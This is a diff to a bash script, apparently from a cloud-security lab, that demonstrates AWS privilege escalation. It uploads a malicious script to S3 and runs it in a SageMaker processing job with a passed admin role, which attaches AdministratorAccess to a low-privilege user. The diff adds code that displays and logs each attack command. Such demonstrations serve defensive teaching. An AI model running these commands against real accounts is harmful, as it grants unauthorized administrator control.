@@ -5,7 +5,9 @@
 # can execute arbitrary code with elevated privileges by creating a SageMaker processing job
 # with an admin execution role and a malicious processing script.
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-sagemaker-003-to-admin-starting-user"
@@ -75,6 +95,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -86,6 +107,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -93,6 +115,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -147,6 +170,7 @@ echo -e "${GREEN}✓ Created malicious processing script${NC}\n"
 echo -e "${YELLOW}Step 6: Uploading malicious script to S3${NC}"
 echo "Uploading exploit.py to s3://$BUCKET_NAME/scripts/exploit.py"
 
+show_cmd aws s3 cp /tmp/exploit.py s3://$BUCKET_NAME/scripts/exploit.py
 aws s3 cp /tmp/exploit.py s3://$BUCKET_NAME/scripts/exploit.py
 
 echo -e "${GREEN}✓ Uploaded script to S3${NC}\n"
@@ -196,6 +220,7 @@ esac
 
 echo "Using container image: $CONTAINER_IMAGE"
 
+show_attack_cmd aws sagemaker create-processing-job --region $AWS_REGION --processing-job-name $PROCESSING_JOB_NAME --role-arn $PASSABLE_ROLE_ARN --processing-inputs "[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\":\"s3://$BUCKET_NAME/scripts/\",\"LocalPath\":\"/opt/ml/processing/input/code\",\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]" --processing-output-config "{\"Outputs\":[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://$BUCKET_NAME/output/\",\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]}" --processing-resources "{\"ClusterConfig\":{\"InstanceCount\":1,\"InstanceType\":\"ml.t3.medium\",\"VolumeSizeInGB\":10}}" --app-specification "{\"ImageUri\":\"$CONTAINER_IMAGE\",\"ContainerEntrypoint\":[\"python3\"],\"ContainerArguments\":[\"/opt/ml/processing/input/code/exploit.py\"]}"
 aws sagemaker create-processing-job \
     --region $AWS_REGION \
     --processing-job-name $PROCESSING_JOB_NAME \
@@ -266,6 +291,7 @@ export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
 export AWS_REGION=$AWS_REGION
 unset AWS_SESSION_TOKEN
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -288,6 +314,18 @@ echo "5. Passed admin role to processing job: $PASSABLE_ROLE_NAME"
 echo "6. Processing job executed script with admin privileges"
 echo "7. Script attached AdministratorAccess policy to starting user"
 echo "8. Achieved: Full administrator access"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → PassRole + CreateProcessingJob"
+echo "  → Processing Job with $PASSABLE_ROLE_NAME (Admin)"
+echo "  → Execute malicious script → Admin Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts Created:${NC}"
 echo "- SageMaker processing job: $PROCESSING_JOB_NAME"
